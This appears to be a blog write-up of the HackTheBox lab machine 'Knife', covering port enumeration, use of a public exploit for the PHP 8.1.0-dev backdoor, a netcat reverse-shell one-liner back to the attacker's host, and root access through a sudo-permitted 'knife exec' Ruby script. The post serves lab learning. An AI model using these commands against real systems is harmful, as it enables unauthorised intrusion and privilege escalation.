---
layout: post
title: "Knife Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Knife

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.134.5 folder that I have attached to this post.

## Enumeration summary

```
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)

80/tcp open  Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
Summary   : Script, HTML5, Apache[2.4.41], PHP[8.1.0-dev], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], X-Powered-By[PHP/8.1.0-dev]
```

## Exploitation

Found these CVE’s but I gotta enumerate a bit more in order to exploit them:

```
https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce/php/sid-4487
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841
```

I did not get anywhere with these. I started this machine when it was first released, though after a while I gave up. cam back later when google had some decent exploit results for me: https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html

This should be easy:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ python3 exp.py -u http://10.129.42.93/ -c whoami
[+] Results:
james

┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ python3 exp.py -u http://10.129.42.93/ -c ls
[+] Results:
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var

```

This exploit was part of a recent backdoor placed in the PHP Git repo:https://flast101.github.io/php-8.1.0-dev-backdoor-rce/

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ python3 exp.py -u http://10.129.42.93/ -c "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f"
```

```
──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ nc -lvp 4444                                                                                                   1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.32] from 10.129.42.93 [10.129.42.93] 52488
/bin/sh: 0: can't access tty; job control turned off
$ dir
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
$ cd home
$ dir
james
$ cd james
$ dir
user.txt
$ cat user.txt
d2159cda23135f4b5f65af8bd0fbe1b3

```

Privesc time:

```
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

If you do `sudo /usr/bin/knife`:

```
** EXEC COMMANDS **
knife exec [SCRIPT] (options)

```

```
$ echo 'system("whoami")' > test.sh
$ cat test.sh
system("whoami")
$ mv test.sh test.rb
$ sudo /usr/bin/knife exec test.rb
root
$

```

I thought it was sh at first. But I got some ruby errors, so I tried ruby and it worked.

```
$ echo system("whoami") > test.sh
/bin/sh: 5: Syntax error: "(" unexpected
$ echo 'system("whoami")' > test.sh
$ cat test.sh
system("whoami")
$ mv test.sh test.rb
$ sudo /usr/bin/knife exec test.rb
root
$ echo system("cat /root/root.txt") > test.rb
/bin/sh: 9: Syntax error: "(" unexpected
$ echo 'system("cat /root/root.txt")' > test.rb
$ sudo /usr/bin/knife exec test.rb
5656d576beeb308cd9c5b362bd4b2962
$

```

## Final thoughts

If the exploit was a little more known when I started this box, I would have got it instantly. This is a very easy 20 pointer.
